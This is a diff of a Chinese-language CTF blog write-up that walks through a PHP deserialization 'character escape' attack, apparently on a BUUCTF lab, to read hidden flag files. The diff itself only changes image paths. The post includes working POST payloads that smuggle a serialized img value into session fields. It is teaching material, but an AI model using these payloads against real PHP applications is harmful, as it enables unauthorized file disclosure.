@@ -105,8 +105,8 @@
 
 <p>原因是在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化。</p>
 <h4 id="三-思路构建"><a href="#三-思路构建" class="headerlink" title="三.思路构建"></a>三.思路构建</h4><p>我们看到代码段有一个hint，试着构建<code>f=phpinfo</code></p>
-<p><img src="/2021/07/27/buuctf17/image-20210728161814360.png" alt="image-20210728161814360"></p>
-<p>phpinfo中会显示很多配置项，我们看到<code>auto_append_file=d0g3_f1ag.php</code>，会在页面底部加载d0g3_f1ag.php文件，那么很可能flag在这里面。对<code>d0g3_f1ag.php</code> base64编码<img src="/2021/07/27/buuctf17/image-20210728163645408.png" alt="image-20210728163645408"></p>
+<p><img src="/buuctf17.assets/image-20210728161814360.png" alt="image-20210728161814360"></p>
+<p>phpinfo中会显示很多配置项，我们看到<code>auto_append_file=d0g3_f1ag.php</code>，会在页面底部加载d0g3_f1ag.php文件，那么很可能flag在这里面。对<code>d0g3_f1ag.php</code> base64编码<img src="/buuctf17.assets/image-20210728163645408.png" alt="image-20210728163645408"></p>
 <p>我们在源码中看到当GET的<code>f=show_image</code>时会调用file_get_contents函数，但是他的参数时base64编码的img，我们已知img是不可控的，但是我们这里可以利用他序列化后又反序列化过程的反序列化字符逃逸。</p>
 <p>我们POST下面字符串：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a<span class="string">&quot;;s:8:&quot;</span>function<span class="string">&quot;;s:7:&quot;</span><span class="number">1234567</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;   //这里我们没有对$_SESSION[&#x27;img&#x27;]赋值，因此会被默认赋值base64_encode(&#x27;guest_img.png&#x27;)</span></span><br></pre></td></tr></table></figure>
@@ -127,14 +127,14 @@
 <p>这样的序列化字符串反序列化后得</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#x27;</span>；</span><br><span class="line">$_SESSION[<span class="string">&quot;function&quot;</span>]=<span class="number">1234567</span>;</span><br><span class="line">$_SESSION[<span class="string">&quot;img&quot;</span>]=ZDBnM19mMWFnLnBocA==;</span><br></pre></td></tr></table></figure>
 
-<p>这样我们利用反序列化字符逃逸就达到了我们给img赋值的目的<img src="/2021/07/27/buuctf17/image-20210728164747774.png" alt="image-20210728164747774"></p>
-<p>页面没有回显，查看源码：<img src="/2021/07/27/buuctf17/image-20210728164812644.png" alt="image-20210728164812644"></p>
+<p>这样我们利用反序列化字符逃逸就达到了我们给img赋值的目的<img src="/buuctf17.assets/image-20210728164747774.png" alt="image-20210728164747774"></p>
+<p>页面没有回显，查看源码：<img src="/buuctf17.assets/image-20210728164812644.png" alt="image-20210728164812644"></p>
 <p>base64编码<code>/d0g3_fllllllag</code></p>
-<p><img src="/2021/07/27/buuctf17/image-20210728165030443.png" alt="image-20210728165030443"></p>
+<p><img src="/buuctf17.assets/image-20210728165030443.png" alt="image-20210728165030443"></p>
 <p>刚好这串字符串长度也是20，直接带入到我们上面的payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/27/buuctf17/image-20210728165341712.png" alt="image-20210728165341712"></p>
+<p><img src="/buuctf17.assets/image-20210728165341712.png" alt="image-20210728165341712"></p>
 <p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43622442/article/details/106003691">https://blog.csdn.net/qq_43622442/article/details/106003691</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
